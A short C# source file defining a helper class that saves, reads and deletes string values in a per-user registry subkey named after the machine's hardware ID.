using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Client.Helper
{
    public class RegistryDB
    {
        private static readonly string ID = Methods.HWID();

        public static bool SetValue(string name, string value)
        {
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(ID, RegistryKeyPermissionCheck.ReadWriteSubTree))
            {
                key.SetValue(name, value, RegistryValueKind.String);
                return true;
            }
        }

        public static string GetValue(string value)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(ID))
                {
                    if (key == null) return null;
                    object o = key.GetValue(value);
                    if (o == null) return null;
                    return (string)o;
                }
            }
            catch { }
            return null;
        }

        public static bool DeleteValue(string name)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(ID, true))
                {
                    if (key == null) return false;
                    key.DeleteValue(name);
                    return true;
                }
            }
            catch { }
            return false;
        }

        public static bool DeleteSubKey()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("", true))
                {
                    key.DeleteSubKeyTree(ID);
                    return true;
                }
            }
            catch { }
            return false;
        }
    }
}
